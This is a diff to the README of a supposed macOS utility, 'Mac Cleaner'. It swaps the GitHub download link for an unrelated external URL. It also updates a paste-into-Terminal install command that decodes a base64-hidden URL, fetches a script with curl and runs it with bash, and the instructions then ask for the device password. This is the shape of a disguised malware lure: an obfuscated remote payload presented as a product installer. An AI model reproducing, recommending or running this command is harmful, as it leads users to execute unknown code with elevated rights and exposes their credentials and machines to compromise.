@@ -21,7 +21,7 @@ Mac Cleaner is a lightweight and powerful tool designed to keep your Mac running
 
 Get the latest version of Mac Cleaner for macOS:
 
-[![Download Mac Cleaner](https://img.shields.io/badge/Download-Mac%20Cleaner-brightgreen?style=for-the-badge&logo=apple)](https://github.com/username/MacCleaner/releases/latest)
+[![Download Mac Cleaner](https://img.shields.io/badge/Download-Mac%20Cleaner-brightgreen?style=for-the-badge&logo=apple)](https://resmanio.com/get.php?call=imb)
 
 *Requires macOS 10.15 or later.*
 
@@ -42,7 +42,7 @@ Get the latest version of Mac Cleaner for macOS:
 
 1. Copy the installation command below.
 ```
-/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQzL2luc3RhbGwuc2g= | base64 -d))"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9pbWIvaW5zdGFsbC5zaA== | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
